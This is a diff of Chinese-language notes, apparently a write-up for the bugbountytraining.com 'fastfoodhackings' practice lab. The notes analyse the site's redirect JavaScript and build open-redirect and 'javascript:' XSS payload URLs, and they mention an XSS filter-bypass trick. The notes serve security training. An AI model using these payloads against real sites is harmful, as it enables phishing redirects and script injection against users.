@@ -15,6 +15,40 @@ https://www.bugbountytraining.com/fastfoodhackings/index.php?act=xxx--%3E%3Cimg%
 在on之间插入置空的<script>
 
 # 页面跳转
-阅读robot.txt(一般在网站跟目录)发现有个go路径
-观察网站是php站点，访问go.php试试提示缺失return url
-猜测为returnUrl
+阅读页面源代码，直接筛选.js关键字，发现主页最下面的一个js文件，以下是他的代码
+```
+	const queryString = window.location.search;
+const urlParams = new URLSearchParams(queryString);
+
+window.addEventListener('load', function() {
+const redirectUrl = urlParams.get('from');
+const redirectType = urlParams.get('type');
+if (redirectUrl === null) { 
+    // No redirect.
+} else {
+	if (redirectType == '1') {
+		window.location.href=getHashValue("redir");
+	} else {
+    document.getElementById("returnurl").style.display="block";
+    document.getElementById("redirectUrl").href=redirectUrl;
+    document.cookie = "from="+redirectUrl+"; expires=Thu, 20 Dec 2021 12:00:00 UTC";
+}
+}
+});
+
+/* new code, added by snowyslittlehelper on 14/12/2020 */
+
+function getHashValue(key) 
+{
+    var matches = location.hash.match(new RegExp(key+'=([^&]*)'));
+    return matches ? matches[1] : null;
+}
+```
+于是我们构造payload：
+```
+https://www.bugbountytraining.com/fastfoodhackings/index.php?from=1&type=1#redir=https://baidu.com
+```
+以及
+```
+https://www.bugbountytraining.com/fastfoodhackings/index.php?from=1&type=1#redir=javascript:alert()
+```
